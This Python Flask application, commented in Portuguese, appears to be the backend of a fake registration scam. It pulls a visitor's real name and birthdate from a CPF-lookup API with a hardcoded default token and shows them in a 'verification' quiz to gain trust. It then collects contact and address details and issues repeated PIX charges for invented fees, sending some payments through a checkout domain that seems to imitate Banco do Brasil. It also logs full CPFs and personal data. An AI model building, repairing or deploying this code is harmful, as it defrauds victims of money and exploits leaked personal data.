import os
import random
import requests
import logging
from datetime import datetime, timedelta
from typing import Dict, Any
from flask import Flask, render_template, url_for, request, redirect, flash, session, jsonify
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy.orm import DeclarativeBase
from urllib.parse import urlparse, urlencode, quote
from techbynet_api import create_techbynet_api

# Configuração do logging
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Criar a aplicação Flask
app = Flask(__name__)
app.static_folder = 'static'

# Configurar secret key
app.secret_key = os.environ.get("SESSION_SECRET")
logger.info("Secret key configurada com sucesso")

# Configuração do banco de dados usando as variáveis de ambiente do Replit
database_url = os.environ.get("DATABASE_URL")
if not database_url:
    logger.error("DATABASE_URL não encontrada")
    raise ValueError("DATABASE_URL não configurada")

logger.info("Iniciando configuração do banco de dados...")
try:
    result = urlparse(database_url)
    if not all([result.scheme, result.netloc]):
        raise ValueError("URL do banco de dados inválida")
    logger.info(f"Esquema do banco: {result.scheme}")
    logger.info("Banco de dados conectado com sucesso")
except Exception as e:
    logger.error(f"Erro ao validar DATABASE_URL: {str(e)}")
    raise

app.config["SQLALCHEMY_DATABASE_URI"] = database_url
app.config["SQLALCHEMY_ENGINE_OPTIONS"] = {
    "pool_recycle": 300,
    "pool_pre_ping": True,
}
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
logger.info("Configuração do banco de dados completa")

# Inicializar SQLAlchemy
class Base(DeclarativeBase):
    pass

db = SQLAlchemy(model_class=Base)
db.init_app(app)
logger.info("SQLAlchemy inicializado")

# Criar tabelas
with app.app_context():
    try:
        db.create_all()
        logger.info("Tabelas do banco de dados criadas com sucesso")
    except Exception as e:
        logger.error(f"Erro ao criar tabelas: {str(e)}")
        raise

# Atualizar a URL da API (linha 75)
CPF_API_TOKEN = os.environ.get("CPF_API_TOKEN", "1285fe4s-e931-4071-a848-3fac8273c55a")
API_URL = f"https://consulta.fontesderenda.blog/cpf.php?token={CPF_API_TOKEN}&cpf={{cpf}}"

# Facebook Pixel ID
FACEBOOK_PIXEL_ID = os.environ.get("FACEBOOK_PIXEL_ID")

# Context processor para tornar o pixel_id disponível em todos os templates
@app.context_processor
def inject_pixel_id():
    return {'pixel_id': FACEBOOK_PIXEL_ID}

@app.route('/consultar_cpf', methods=['POST'])
def consultar_cpf():
    cpf_numerico = None  # Inicializa a variável
    try:
        cpf = request.form.get('cpf', '').strip()
        cpf_numerico = ''.join(filter(str.isdigit, cpf))

        if not cpf_numerico or len(cpf_numerico) != 11:
            logger.warning(f"CPF inválido tentando ser consultado: {cpf}")
            flash('CPF inválido. Por favor, digite um CPF válido.')
            return redirect(url_for('index'))

        # Resto do código permanece igual
        logger.info(f"Iniciando consulta do CPF: {cpf_numerico[:3]}****{cpf_numerico[-2:]}")
        response = requests.get(
            API_URL.format(cpf=cpf_numerico),
            timeout=30
        )
        response.raise_for_status()
        dados = response.json()

        if dados and isinstance(dados, dict):
            if 'DADOS' in dados:
                nome_sanitizado = dados['DADOS']['nome'].strip().upper()
                data_nasc = dados['DADOS']['data_nascimento'].split()[0]
                dados_usuario = {
                    'cpf': cpf_numerico,
                    'nome_real': nome_sanitizado,
                    'data_nasc': data_nasc,
                    'nomes': gerar_nomes_falsos(nome_sanitizado)
                }
            else:
                logger.error(f"Estrutura de dados inválida da API: {dados}")
                flash('CPF não encontrado na base de dados.')
                return redirect(url_for('index'))

            session['dados_usuario'] = dados_usuario
            logger.info(f"Consulta bem sucedida para CPF: {cpf_numerico[:3]}****{cpf_numerico[-2:]}")

            return render_template('verificar_nome.html',
                                   dados=dados_usuario,
                                   current_year=datetime.now().year)
        else:
            logger.warning(f"Dados incompletos retornados da API para CPF: {cpf_numerico[:3]}****{cpf_numerico[-2:]}")
            flash('CPF não encontrado na base de dados.')
            return redirect(url_for('index'))

    except requests.RequestException as e:
        cpf_safe = cpf_numerico[:3] + "****" + cpf_numerico[-2:] if cpf_numerico and len(cpf_numerico) >= 5 else "invalid"
        logger.error(f"Erro na requisição API para CPF {cpf_safe}: {str(e)}")
        flash('Erro ao consultar CPF. Por favor, tente novamente em alguns instantes.')
        return redirect(url_for('index'))
    except Exception as e:
        cpf_safe = cpf_numerico[:3] + "****" + cpf_numerico[-2:] if cpf_numerico and len(cpf_numerico) >= 5 else "invalid"
        logger.error(f"Erro inesperado ao consultar CPF {cpf_safe}: {str(e)}")
        flash('Ocorreu um erro inesperado. Por favor, tente novamente.')
        return redirect(url_for('index'))

ESTADOS = {
    'Acre': 'AC',
    'Alagoas': 'AL',
    'Amapá': 'AP',
    'Amazonas': 'AM',
    'Bahia': 'BA',
    'Ceará': 'CE',
    'Distrito Federal': 'DF',
    'Espírito Santo': 'ES',
    'Goiás': 'GO',
    'Maranhão': 'MA',
    'Mato Grosso': 'MT',
    'Mato Grosso do Sul': 'MS',
    'Minas Gerais': 'MG',
    'Pará': 'PA',
    'Paraíba': 'PB',
    'Paraná': 'PR',
    'Pernambuco': 'PE',
    'Piauí': 'PI',
    'Rio de Janeiro': 'RJ',
    'Rio Grande do Norte': 'RN',
    'Rio Grande do Sul': 'RS',
    'Rondônia': 'RO',
    'Roraima': 'RR',
    'Santa Catarina': 'SC',
    'São Paulo': 'SP',
    'Sergipe': 'SE',
    'Tocantins': 'TO'
}

def get_estado_from_ip(ip_address: str) -> str:
    """
    Obtém o estado baseado no IP do usuário usando um serviço de geolocalização
    """
    try:
        response = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success' and data.get('country') == 'Brazil':
                estado = data.get('region')
                # Procura o estado no dicionário de mapeamento
                for estado_nome, sigla in ESTADOS.items():
                    if sigla == estado:
                        return f"{estado_nome} - {sigla}"
    except Exception as e:
        logger.error(f"Erro ao obter localização do IP: {str(e)}")

    # Se não conseguir determinar o estado, retorna São Paulo como padrão
    return "São Paulo - SP"

def get_client_ip() -> str:
    """
    Obtém o IP do cliente, considerando possíveis proxies
    """
    forwarded_for = request.headers.get('X-Forwarded-For')
    if forwarded_for:
        ip = forwarded_for.split(',')[0]
    else:
        ip = request.remote_addr or '127.0.0.1'
    return ip

def gerar_nomes_falsos(nome_real: str) -> list:
    nomes = [
        "MARIA SILVA SANTOS",
        "JOSE OLIVEIRA SOUZA",
        "ANA PEREIRA LIMA",
        "JOAO FERREIRA COSTA",
        "ANTONIO RODRIGUES ALVES",
        "FRANCISCO GOMES SILVA",
        "CARLOS SANTOS OLIVEIRA",
        "PAULO RIBEIRO MARTINS",
        "PEDRO ALMEIDA COSTA",
        "LUCAS CARVALHO LIMA"
    ]
    # Remove nomes que são muito similares ao nome real
    nomes = [n for n in nomes if len(set(n.split()) & set(nome_real.split())) == 0]
    # Seleciona 2 nomes aleatórios
    nomes_falsos = random.sample(nomes, 2)
    # Adiciona o nome real e embaralha
    todos_nomes = nomes_falsos + [nome_real]
    random.shuffle(todos_nomes)
    return todos_nomes

def gerar_datas_falsas(data_real: str) -> list:
    data_real_dt = datetime.strptime(data_real.split()[0], '%Y-%m-%d')
    datas_falsas = []

    # Gera duas datas falsas próximas à data real
    for _ in range(2):
        dias = random.randint(-365*2, 365*2)  # ±2 anos
        data_falsa = data_real_dt + timedelta(days=dias)
        datas_falsas.append(data_falsa)

    # Adiciona a data real e embaralha
    todas_datas = datas_falsas + [data_real_dt]
    random.shuffle(todas_datas)

    # Formata as datas no padrão brasileiro
    return [data.strftime('%d/%m/%Y') for data in todas_datas]

@app.route('/verificar_nome', methods=['POST'])
def verificar_nome():
    nome_selecionado = request.form.get('nome')
    dados_usuario = session.get('dados_usuario')

    if not dados_usuario:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('index'))
    
    if not nome_selecionado:
        flash('Por favor, selecione um nome.')
        return render_template('verificar_nome.html',
                              dados=dados_usuario,
                              current_year=datetime.now().year)

    if nome_selecionado != dados_usuario['nome_real']:
        flash('Nome selecionado incorreto. Por favor, tente novamente.')
        return render_template('verificar_nome.html',
                              dados=dados_usuario,
                              current_year=datetime.now().year)

    # Gera datas falsas para a próxima etapa
    datas = gerar_datas_falsas(dados_usuario['data_nasc'])
    dados_usuario['datas'] = datas
    session['dados_usuario'] = dados_usuario

    return render_template('verificar_data.html',
                         dados=dados_usuario,
                         current_year=datetime.now().year)

@app.route('/verificar_data', methods=['POST'])
def verificar_data():
    data_selecionada = request.form.get('data')
    dados_usuario = session.get('dados_usuario')

    if not dados_usuario or not data_selecionada:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('index'))

    data_real = datetime.strptime(dados_usuario['data_nasc'].split()[0], '%Y-%m-%d').strftime('%d/%m/%Y')
    if data_selecionada != data_real:
        flash('Data selecionada incorreta. Por favor, tente novamente.')
        return redirect(url_for('index'))

    # Obtém o estado baseado no IP do usuário
    ip_address = get_client_ip()
    estado_atual = get_estado_from_ip(ip_address)

    return render_template('selecionar_estado.html', 
                         estado_atual=estado_atual,
                         current_year=datetime.now().year)

@app.route('/selecionar_estado', methods=['POST'])
def selecionar_estado():
    estado = request.form.get('estado')
    dados_usuario = session.get('dados_usuario')

    if not dados_usuario or not estado:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('index'))

    # Salva o estado selecionado na sessão
    dados_usuario['estado'] = estado
    session['dados_usuario'] = dados_usuario

    # Redireciona para a seleção de nível, passando o estado selecionado
    return render_template('selecionar_nivel.html', 
                         estado=estado,
                         current_year=datetime.now().year)

@app.route('/selecionar_nivel', methods=['POST'])
def selecionar_nivel():
    nivel = request.form.get('nivel')
    dados_usuario = session.get('dados_usuario')

    if not dados_usuario or not nivel:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('index'))

    # Salva o nível selecionado na sessão
    dados_usuario['nivel'] = nivel
    session['dados_usuario'] = dados_usuario

    # Redireciona para a página de contato
    return render_template('verificar_contato.html',
                         dados={
                             'name': dados_usuario['nome_real'],
                             'cpf': dados_usuario['cpf'],
                             'estado': dados_usuario['estado']
                         },
                         current_year=datetime.now().year)

@app.route('/verificar_contato', methods=['POST'])
def verificar_contato():
    email = request.form.get('email')
    telefone = request.form.get('telefone')
    dados_usuario = session.get('dados_usuario')

    if not dados_usuario or not email or not telefone:
        flash('Sessão expirada ou dados incompletos. Por favor, tente novamente.')
        return redirect(url_for('index'))

    # Adiciona os dados de contato ao objeto dados_usuario
    dados_usuario['email'] = email
    dados_usuario['phone'] = ''.join(filter(str.isdigit, telefone))  # Remove formatação
    session['dados_usuario'] = dados_usuario

    # Redireciona para a página de endereço
    return redirect(url_for('verificar_endereco'))

@app.route('/verificar_endereco', methods=['GET', 'POST'])
def verificar_endereco():
    dados_usuario = session.get('dados_usuario')
    if not dados_usuario:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('index'))

    if request.method == 'POST':
        # Coleta os dados do formulário
        endereco = {
            'cep': request.form.get('cep'),
            'logradouro': request.form.get('logradouro'),
            'numero': request.form.get('numero'),
            'complemento': request.form.get('complemento'),
            'bairro': request.form.get('bairro'),
            'cidade': request.form.get('cidade'),
            'estado': request.form.get('estado')
        }

        # Valida se os campos obrigatórios foram preenchidos
        campos_obrigatorios = ['cep', 'logradouro', 'numero', 'bairro', 'cidade', 'estado']
        if not all(endereco.get(campo) for campo in campos_obrigatorios):
            flash('Por favor, preencha todos os campos obrigatórios.')
            return render_template('verificar_endereco.html', 
                                  current_year=datetime.now().year)

        # Adiciona o endereço aos dados do usuário
        dados_usuario['endereco'] = endereco
        session['dados_usuario'] = dados_usuario

        # Redireciona para a página de aviso de pagamento
        return render_template('aviso_pagamento.html',
                            dados={'name': dados_usuario['nome_real'],
                                  'email': dados_usuario['email'],
                                  'phone': dados_usuario['phone'],
                                  'cpf': dados_usuario['cpf']},
                            current_year=datetime.now().year)

    # GET request - mostra o formulário
    return render_template('verificar_endereco.html',
                         current_year=datetime.now().year)

@app.route('/pagamento_pix', methods=['GET'])
def pagamento_pix():
    dados_usuario = session.get('dados_usuario')
    if not dados_usuario:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('index'))

    # Gerar PIX real usando TechByNet API
    try:
        techbynet_api = create_techbynet_api()
        
        # Criar transação PIX
        pix_result = techbynet_api.create_pix_transaction(
            customer_data=dados_usuario,
            amount=59.00,  # Valor da taxa de inscrição
            phone=dados_usuario.get('phone')
        )
        
        if pix_result.get('success'):
            logger.info(f"PIX gerado com sucesso - ID: {pix_result.get('transaction_id')}")
            
            # Salvar dados do PIX na sessão
            session['pix_data'] = {
                'transaction_id': pix_result.get('transaction_id'),
                'qr_code': pix_result.get('qr_code'),
                'pix_code': pix_result.get('pix_code'),
                'amount': 59.00,
                'expires_at': pix_result.get('expires_at')
            }
            
            return render_template('pagamento_pix.html',
                                pix_data=pix_result,
                                dados={'name': dados_usuario['nome_real'],
                                      'email': dados_usuario['email'],
                                      'phone': dados_usuario['phone'],
                                      'cpf': dados_usuario['cpf']},
                                valor_total="59,00",
                                current_year=datetime.now().year)
        else:
            logger.error(f"Erro ao gerar PIX: {pix_result.get('error')}")
            flash('Erro ao gerar pagamento PIX. Tente novamente.')
            return redirect(url_for('verificar_endereco'))
            
    except Exception as e:
        logger.error(f"Erro inesperado ao gerar PIX: {str(e)}")
        flash('Erro interno. Tente novamente.')
        return redirect(url_for('verificar_endereco'))


class For4PaymentsAPI:
    API_URL = "https://app.for4payments.com.br/api/v1"

    def __init__(self, secret_key: str):
        self.secret_key = secret_key

    def _get_headers(self) -> Dict[str, str]:
        return {
            'Authorization': self.secret_key,
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        }

    def create_pix_payment(self, data: Dict[str, Any]) -> Dict[str, Any]:
        try:
            # Format and validate amount
            amount_in_cents = int(float(data['amount']) * 100)

            payment_data = {
                "name": data['name'],
                "email": data['email'],
                "cpf": ''.join(filter(str.isdigit, data['cpf'])),
                "phone": data.get('phone', ''),
                "paymentMethod": "PIX",
                "amount": amount_in_cents,
                "items": [{
                    "title": "FINALIZAR INSCRICAO",
                    "quantity": 1,
                    "unitPrice": amount_in_cents,
                    "tangible": False
                }]
            }

            response = requests.post(
                f"{self.API_URL}/transaction.purchase",
                json=payment_data,
                headers=self._get_headers(),
                timeout=30
            )

            if response.status_code == 200:
                response_data = response.json()
                return {
                    'id': response_data.get('id'),
                    'pixCode': response_data.get('pixCode'),
                    'pixQrCode': response_data.get('pixQrCode'),
                    'expiresAt': response_data.get('expiresAt'),
                    'status': response_data.get('status', 'pending')
                }
            else:
                logger.error(f"Erro na API de pagamento: {response.text}")
                raise ValueError("Erro ao processar pagamento")

        except Exception as e:
            logger.error(f"Erro ao criar pagamento: {str(e)}")
            raise

    def check_payment_status(self, payment_id: str) -> Dict[str, Any]:
        """Check the status of a payment"""
        try:
            response = requests.get(
                f"{self.API_URL}/transaction.getPayment",
                params={'id': payment_id},
                headers=self._get_headers(),
                timeout=30
            )

            logger.info(f"Payment status check response: {response.status_code}")
            logger.debug(f"Payment status response body: {response.text}")

            if response.status_code == 200:
                payment_data = response.json()
                # Map For4Payments status to our application status
                status_mapping = {
                    'PENDING': 'pending',
                    'PROCESSING': 'pending',
                    'APPROVED': 'completed',
                    'COMPLETED': 'completed',
                    'PAID': 'completed',
                    'EXPIRED': 'failed',
                    'FAILED': 'failed',
                    'CANCELED': 'cancelled',
                    'CANCELLED': 'cancelled'
                }

                current_status = payment_data.get('status', 'PENDING')
                mapped_status = status_mapping.get(current_status, 'pending')

                logger.info(f"Payment {payment_id} status: {current_status} -> {mapped_status}")

                return {
                    'status': mapped_status,
                    'pix_qr_code': payment_data.get('pixQrCode'),
                    'pix_code': payment_data.get('pixCode')
                }
            elif response.status_code == 404:
                logger.warning(f"Payment {payment_id} not found")
                return {'status': 'pending'}
            else:
                error_message = f"Failed to fetch payment status (Status: {response.status_code})"
                logger.error(error_message)
                return {'status': 'pending'}

        except Exception as e:
            logger.error(f"Error checking payment status: {str(e)}")
            return {'status': 'pending'}


def create_payment_api() -> For4PaymentsAPI:
    # Use environment variable for API key security
    secret_key = os.environ.get("FOR4_PAYMENTS_SECRET_KEY")
    if not secret_key:
        logger.error("FOR4_PAYMENTS_SECRET_KEY não encontrada nas variáveis de ambiente")
        raise ValueError("FOR4_PAYMENTS_SECRET_KEY não configurada")
    logger.info("Inicializando API de pagamento For4Payments")
    return For4PaymentsAPI(secret_key)

@app.route('/')
def index():
    today = datetime.now()
    logger.debug(f"Current date - Year: {today.year}, Month: {today.month}, Day: {today.day}")
    return render_template('index.html', 
                         current_year=today.year,
                         current_month=str(today.month).zfill(2),
                         current_day=str(today.day).zfill(2))


@app.route('/frete_apostila', methods=['GET', 'POST'])
def frete_apostila():
    user_data = session.get('dados_usuario') 
    if not user_data:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('index'))

    if request.method == 'POST':
        try:
            # Coleta os dados do formulário
            endereco = {
                'cep': request.form.get('cep'),
                'logradouro': request.form.get('street'),
                'numero': request.form.get('number'),
                'complemento': request.form.get('complement'),
                'bairro': request.form.get('neighborhood'),
                'cidade': request.form.get('city'),
                'estado': request.form.get('state')
            }

            # Valida se os campos obrigatórios foram preenchidos
            campos_obrigatorios = ['cep', 'logradouro', 'numero', 'bairro', 'cidade', 'estado']
            if not all(endereco.get(campo) for campo in campos_obrigatorios):
                flash('Por favor, preencha todos os campos obrigatórios.')
                return render_template('frete_apostila.html', 
                                    user_data=user_data,
                                    current_year=datetime.now().year)

            # Salva o endereço na sessão
            user_data['endereco'] = endereco
            session['dados_usuario'] = user_data

            # Gera o pagamento PIX
            payment_api = create_payment_api()
            payment_data = {
                'name': user_data['nome_real'], 
                'email': user_data.get('email', generate_random_email()), 
                'cpf': user_data['cpf'],
                'phone': user_data.get('phone', generate_random_phone()), 
                'amount': 48.19  # Valor do frete
            }

            pix_data = payment_api.create_pix_payment(payment_data)
            return render_template('pagamento.html',
                               pix_data=pix_data,
                               valor_total="48,19",
                               current_year=datetime.now().year)

        except Exception as e:
            logger.error(f"Erro ao processar formulário: {e}")
            flash('Erro ao processar o formulário. Por favor, tente novamente.')
            return redirect(url_for('frete_apostila'))

    return render_template('frete_apostila.html', 
                         user_data=user_data,
                         current_year=datetime.now().year)

@app.route('/pagamento', methods=['GET', 'POST'])
def pagamento():
    user_data = session.get('dados_usuario') 
    if not user_data:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('index'))

    try:
        payment_api = create_payment_api()
        payment_data = {
            'name': user_data['nome_real'], 
            'email': user_data.get('email', generate_random_email()), 
            'cpf': user_data['cpf'],
            'phone': user_data.get('phone', generate_random_phone()), 
            'amount': 247.10  
        }

        pix_data = payment_api.create_pix_payment(payment_data)
        return render_template('pagamento.html',
                           pix_data=pix_data,
                           valor_total="247,10",
                           current_year=datetime.now().year)

    except Exception as e:
        logger.error(f"Erro ao gerar pagamento: {e}")
        flash('Erro ao gerar o pagamento. Por favor, tente novamente.')
        return redirect(url_for('index'))

@app.route('/pagamento_categoria', methods=['POST'])
def pagamento_categoria():
    user_data = session.get('dados_usuario') 
    if not user_data:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('obrigado'))

    categoria = request.form.get('categoria')
    if not categoria:
        flash('Categoria não especificada.')
        return redirect(url_for('obrigado'))

    try:
        payment_api = create_payment_api()
        payment_data = {
            'name': user_data['nome_real'], 
            'email': user_data.get('email', generate_random_email()), 
            'cpf': user_data['cpf'],
            'phone': user_data.get('phone', generate_random_phone()), 
            'amount': 114.10  
        }

        pix_data = payment_api.create_pix_payment(payment_data)
        return render_template('pagamento_categoria.html',
                           pix_data=pix_data,
                           valor_total="114,10",
                           categoria=categoria,
                           current_year=datetime.now().year)

    except Exception as e:
        logger.error(f"Erro ao gerar pagamento da categoria: {e}")
        flash('Erro ao gerar o pagamento. Por favor, tente novamente.')
        return redirect(url_for('obrigado'))

@app.route('/check_payment/<payment_id>')
def check_payment(payment_id):
    try:
        payment_api = create_payment_api()
        status_data = payment_api.check_payment_status(payment_id)
        return jsonify(status_data)
    except Exception as e:
        logger.error(f"Error checking payment status: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/obrigado')
def obrigado():
    user_data = session.get('dados_usuario') 
    if not user_data:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('index'))
    return render_template('obrigado.html', 
                         current_year=datetime.now().year,
                         user_data=user_data)

@app.route('/categoria/<tipo>')
def categoria(tipo):
    user_data = session.get('dados_usuario') 
    if not user_data:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('index'))
    return render_template(f'categoria_{tipo}.html', 
                         current_year=datetime.now().year,
                         user_data=user_data)

@app.route('/taxa')
def taxa():
    return render_template('taxa.html', current_year=datetime.now().year)

@app.route('/verificar_taxa', methods=['POST'])
def verificar_taxa():
    cpf = request.form.get('cpf', '').strip()
    cpf_numerico = ''.join(filter(str.isdigit, cpf))

    if not cpf_numerico or len(cpf_numerico) != 11:
        flash('CPF inválido. Por favor, digite um CPF válido.')
        return redirect(url_for('taxa'))

    try:
        # Consulta à API
        response = requests.get(
            API_URL.format(cpf=cpf_numerico),
            timeout=30
        )
        response.raise_for_status()
        dados = response.json()
        logger.info(f"Resposta da API para CPF {cpf_numerico}: {dados}")

        if dados and 'DADOS' in dados:
            nome = dados['DADOS'].get('NOME', '')
            session['dados_taxa'] = {
                'name': nome,
                'email': dados.get('EMAIL', {}).get('EMAIL', ''),
                'phone': ''.join(filter(str.isdigit, str(dados.get('TELEFONE', [{}])[0].get('TELEFONE', '')))),
                'cpf': cpf_numerico
            }

            # Gerar pagamento PIX
            try:
                payment_api = create_payment_api()
                payment_data = {
                    'name': nome,
                    'email': session['dados_taxa']['email'],
                    'cpf': cpf_numerico,
                    'phone': session['dados_taxa']['phone'],
                    'amount': 82.10
                }

                logger.info(f"Generating PIX payment for CPF: {cpf_numerico}")
                pix_data = payment_api.create_pix_payment(payment_data)
                logger.info(f"PIX data generated successfully: {pix_data}")

                return render_template('taxa_pendente.html',
                                    dados=session['dados_taxa'],
                                    pix_data=pix_data,
                                    current_year=datetime.now().year)
            except Exception as e:
                logger.error(f"Erro ao gerar pagamento: {e}")
                flash('Erro ao gerar o pagamento. Por favor, tente novamente.')
                return redirect(url_for('taxa'))
        else:
            flash('CPF não encontrado ou dados incompletos.')
            return redirect(url_for('taxa'))

    except Exception as e:
        logger.error(f"Erro na consulta: {str(e)}")
        flash('Erro ao consultar CPF. Por favor, tente novamente.')
        return redirect(url_for('taxa'))

@app.route('/pagamento_taxa', methods=['POST'])
def pagamento_taxa():
    dados = session.get('dados_taxa')
    if not dados:
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('taxa'))

    try:
        payment_api = create_payment_api()
        payment_data = {
            'name': dados['name'],
            'email': dados['email'],
            'cpf': dados['cpf'],
            'phone': dados['phone'],
            'amount': 82.10
        }

        pix_data = payment_api.create_pix_payment(payment_data)
        return render_template('pagamento.html',
                           pix_data=pix_data,
                           valor_total="82,10",
                           current_year=datetime.now().year)

    except Exception as e:
        logger.error(f"Erro ao gerar pagamento: {e}")
        flash('Erro ao gerar o pagamento. Por favor, tente novamente.')
        return redirect(url_for('taxa'))

def generate_random_email():
    return f"user_{random.randint(1,1000)}@example.com"

def generate_random_phone():
    return f"55119{random.randint(10000000,99999999)}"

def generate_checkout_url(user_data: dict) -> str:
    """
    Gera a URL de checkout com os parâmetros do usuário
    """
    base_url = "https://pay.pag-bb-inscreva-se.org/YEwR3A92ebb3dKy"

    # Remove formatação do telefone e garante formato correto
    phone = ''.join(filter(str.isdigit, user_data.get('phone', '')))
    if phone.startswith('55'):
        phone = phone[2:]  # Remove o prefixo 55 se existir

    # Prepara os parâmetros
    params = {
        'email': user_data.get('email', ''),
        'telephone': phone,
        'name': quote(user_data.get('nome_real', '')),
        'document': ''.join(filter(str.isdigit, user_data.get('cpf', '')))
    }

    url = f"{base_url}?{urlencode(params)}"
    logger.info(f"Generated checkout URL: {url}")
    return url

@app.route('/aviso_pagamento')
def aviso_pagamento():
    dados_usuario = session.get('dados_usuario')
    if not dados_usuario:
        logger.warning("Tentativa de acesso sem dados na sessão")
        flash('Sessão expirada. Por favor, faça a consulta novamente.')
        return redirect(url_for('index'))

    logger.info(f"Generating checkout for user: {dados_usuario.get('nome_real')} ({dados_usuario.get('cpf')})")
    checkout_url = generate_checkout_url(dados_usuario)

    dados = {
        'name': dados_usuario['nome_real'],
        'email': dados_usuario['email'],
        'phone': dados_usuario['phone'],
        'cpf': dados_usuario['cpf'],
        'checkout_url': checkout_url
    }

    logger.debug(f"Rendered data: {dados}")
    return render_template('aviso_pagamento.html',
                        dados=dados,
                        current_year=datetime.now().year)


if __name__ == '__main__':
    try:
        port = int(os.environ.get("PORT", 5000))
        logger.info("Iniciando servidor Flask...")
        app.run(host='0.0.0.0', port=port)
    except Exception as e:
        logger.error(f"Erro ao iniciar o servidor Flask: {str(e)}")
        raise